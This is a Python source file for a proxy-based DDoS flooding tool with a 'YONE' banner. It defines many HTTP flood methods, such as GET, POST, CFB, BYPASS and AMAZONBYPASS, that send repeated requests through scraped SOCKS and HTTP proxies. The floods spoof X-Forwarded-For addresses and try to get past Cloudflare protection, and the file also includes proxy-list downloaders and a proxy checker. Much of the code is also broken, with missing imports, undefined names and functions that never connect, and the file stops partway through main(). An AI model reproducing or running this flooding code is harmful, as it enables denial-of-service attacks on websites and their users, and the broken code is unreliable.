# -*- coding: utf-8 -*-

from asyncio import sslproto
from asyncore import loop
from calendar import c
from multiprocessing.connection import wait
from socket import IPPROTO_RAW
from ssl import SOL_SOCKET, SSLContext
from turtle import delay

class color:
   PURPLE = '\033[95m'
   BLUE = '\033[94m'
   CYAN = '\033[96m'
   RED = '\033[91m'
   GREEN = '\033[92m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'  


l7 = ["CFB","GET", "POST","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","MIX","MIXV2","BYPASS","BYPASSV2","AMAZONBYPASS","AMAZONBYPASSV2","CFBV2","KILLALL","HTTP_BETA","CFUAM"]
l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
l3 = ["POD", "ICMP"]
to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
ot = ["STOP", "TOOLS", "HELP"]
methods = l7
methodsl = l7 + l4 + l3 + to + ot


def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


def start_attack(method, threads, event, socks_type):
    global out_file
    # layer7
    cmethod = str(method.upper())
    if (cmethod != "SLOW") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
        out_file = str("files/proxys/" + sys.argv[5])
        proxydl(out_file, socks_type)
        print("""                                          
                    ╔═══╦═══╦═══╦════╗ ╔═══╦═══╦═══╦═══╗
                    ║╔══╣╔═╗║╔═╗║╔╗╔╗║ ╚╗╔╗╠╗╔╗║╔═╗║╔═╗║
                    ║╚══╣║ ║║╚═╝╠╝║║╚╝  ║║║║║║║║║ ║║╚══╗
                    ║╔══╣║ ║║╔╗╔╝ ║║    ║║║║║║║║║ ║╠══╗║
                    ║║  ║╚═╝║║║╚╗ ║║   ╔╝╚╝╠╝╚╝║╚═╝║╚═╝║
                    ╚╝  ╚═══╩╝╚═╝ ╚╝   ╚═══╩═══╩═══╩═══╩═➤ YONE
                ╔═➤ Atttack His Been Distributed   
                ╠═══════════════════════════════════════╗
                ║ ● METHOD: [{}]
                ║ ● TARGET: [{}]       
                ║ ● PORT: [{}]        
                ╠═══════════════════════════════════════╝                                			                        
                ║ ● THREADS: [{}]  
                ║ ● TIME: [{}] 
                ║ ● PROXY: [{}]
                ╚═══════════════════════════════════════╝ 
	                   
                """.format(method, target, port, threads, sys.argv[7],len(proxies), str(nums)))
    else:
        print("{} Attack Started To {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
            for _ in range(threads):
                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
        elif method == "get":
            for _ in range(threads):
                threading.Thread(target=http, args=(event, socks_type), daemon=True).start()
        elif method == "cfb":
            for _ in range(threads):
                threading.Thread(target=cfb, args=(event, socks_type), daemon=True).start()
        elif method == "getv2":
            for _ in range(threads):
                threading.Thread(target=getv2, args=(event, socks_type), daemon=True).start()
        elif method == "httpfast":
            for _ in range(threads):
                threading.Thread(target=httpfast, args=(event, socks_type), daemon=True).start()
        elif method == "httpfastv2":
            for _ in range(threads):
                threading.Thread(target=httpfastv2, args=(event, socks_type), daemon=True).start()
        elif method == "mix":
            for _ in range(threads):
                threading.Thread(target=mix, args=(event, socks_type), daemon=True).start()
        elif method == "mixv2":
            for _ in range(threads):
                threading.Thread(target=mixv2, args=(event, socks_type), daemon=True).start()
        elif method == "spammer":
            for _ in range(threads):
                threading.Thread(target=spammer, args=(event, socks_type), daemon=True).start()
        elif method == "http_beta":
            for _ in range(threads):
                threading.Thread(target=http_beta, args=(event, socks_type), daemon=True).start()
        elif method == "bypass":
            for _ in range(threads):
                threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
        elif method == "bypassv2":
            for _ in range(threads):
                threading.Thread(target=bypassv2, args=(event, socks_type), daemon=True).start()
        elif method == "amazonbypass":
            for _ in range(threads):
                threading.Thread(target=amazonbypass, args=(event, socks_type), daemon=True).start()
        elif method == "amazonbypassv2":
            for _ in range(threads):
                threading.Thread(target=amazonbypassv2, args=(event, socks_type), daemon=True).start()
        elif method == "cfbv2":
            for _ in range(threads):
                threading.Thread(target=cfbv2, args=(event, socks_type), daemon=True).start()
        elif method == "killall":
            for _ in range(threads):
                threading.Thread(target=killall, args=(event, socks_type), daemon=True).start()
        elif method == "socket":
            for _ in range(threads):
                threading.Thread(target=socket, args=(event, socks_type), daemon=True).start()
        elif method == "cfuam":
            for _ in range(threads):
                threading.Thread(target=cfuam, args=(event, socks_type), daemon=True).start()
    except:
        pass

def random_data():
    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))


def Headers(method):
    header = ""
    if method == "get" or method == "getv2" or method == "socket" or method == "httpfast" or method == "httpfastv2" or method == "mix" or method == "mixv2" or method == "bypass" or method == "bypassv2" or method == "amazonbypass" or method == "amazonbypassv2" or method == "cfbv2":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"

    elif method == "brust":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    elif method == "http_beta":
        connection = "Connection: null\r\n"
        connection += "pragma: no-cache\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "X-Forwarded-Host: pornhub.com\r\n"
        connection += "X-Forwarded-For: 127.0.0.1\r\n"
        referer = "Referer: null\r\n"
        content = "Content-Type: text/plain\r\ncharset=utf-8\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + content + useragent + accept + connection + "\r\n\r\n"
    elif method == "post" or method == "spammer" or method == "killall":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        data = str(random._urandom(8))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header


def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)

class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.dominio = ''
        self.DnsType = ''

        HDNS=data[-4:-2].encode("hex")
        if HDNS == "0001":
            self.DnsType='A'
        elif HDNS == "000f":
            self.DnsType='MX'
        elif HDNS == "0002":
            self.DnsType='NS'
        elif HDNS == "0010":
            self.DnsType="TXT"
        else:
            self.DnsType="Unknown"

        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
        if tipo == 0:                     # Standard query
            ini=12
            lon=ord(data[ini])
            while lon != 0:
                self.dominio+=data[ini+1:ini+lon+1]+'.'
                ini+=lon+1
                lon=ord(data[ini])
    def respuesta(self, ip):
        packet=''
        if self.dominio:
            packet+=self.data[:2] + "\x81\x80"
            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
            packet+=self.data[12:]                                         # Original Domain Name Question
            packet+='\xc0\x0c'                                             # Pointer to domain name
            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
        return packet

def http(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def httpfast(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def httpfastv2(event, socks_type):
    header = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()   

def http_beta(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    head_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()           

def mix(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def mixv2(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,socket.TCP_QUICKACK, 1)
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfuam(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s.DEFAULT_CIPHERS = "ECDH+AESGCM:ECDH+CHACHA20:ECDH+AES256:ECDH+AES128:!aNULL:!SHA1:!AESCCM"
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def bypass(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_OPENFAST, 1)
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            cfscrape.create_scraper()
            try:
                sleep(3)
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def killall(event, socks_type):
    header = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY, 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def bypassv2(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_OPENFAST, 1)
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = cfscrape.create_scraper()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(2.5)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def amazonbypass(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("get")
    get_host = "GET " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
                s = cfscrape.create_scraper()
            try:
                sleep(2)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def amazonbypassv2(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("get")
    get_host = "GET " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
                s = cfscrape.create_scraper()
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()



def cfbv2(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(3)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def spammer(event, socks_type):
    header = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_FASTOPEN, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(2)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def postv2(event, socks_type):
    request = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(2)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def getv2(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(2)
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    s = socks.socksocket()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(3)
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()



def cfbc(event, socks_type):
    request = Headers("cfb")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def post(event, socks_type):
    request = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def checking(lines, socks_type, ms):
    global nums, proxies
    proxy = lines.strip().split(":")
    if len(proxy) != 2:
        proxies.remove(lines)
        return
    err = 0
    while True:
        if err == 3:
            proxies.remove(lines)
            break
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(ms)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            s.close()
            break
        except:
            err += 1
    nums += 1


nums = 0


def check_socks(ms):
    global nums
    thread_list = []
    for lines in list(proxies):
        if choice == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms,))
            th.start()
        if choice == "4":
            th = threading.Thread(target=checking, args=(lines, 4, ms,))
            th.start()
        if choice == "1":
            th = threading.Thread(target=checking, args=(lines, 1, ms,))
            th.start()
        thread_list.append(th)
        sleep(0.01)
    for th in list(thread_list):
        th.join()
    ans = "y"
    if ans == "y" or ans == "":
        if choice == "4":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "5":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "1":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()


def check_list(socks_file):
    temp = open(socks_file).readlines()
    temp_list = []
    for i in temp:
        if i not in temp_list:
            if ':' in i:
                temp_list.append(i)
    rfile = open(socks_file, "wb")
    for i in list(temp_list):
        rfile.write(bytes(i, encoding='utf-8'))
    rfile.close()


def downloadsocks(choice):
    global out_file
    if choice == "4":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
                             timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks4", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
        try:

            req = requests.get("https://www.socks-proxy.net/", timeout=5, headers={"User-Agent", UserAgent}).text
            part = str(req)
            part = part.split("<tbody>")
            part = part[1].split("</tbody>")
            part = part[0].split("<tr><td>")
            proxies = ""
            for proxy in part:
                proxy = proxy.split("</td><td>")
                try:
                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
                except:
                    pass
                out_file = open(out_file, "a")
                out_file.write(proxies)
                out_file.close()
        except:
            pass
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
            f.close()


def main():
    global proxies, multiple, choice, timer, out_file
    method = str(sys.argv[1]).lower()
    
    out_file = str("files/proxys/" + sys.argv[5])
    if not os.path.exists(out_file):
        makefile(out_file)

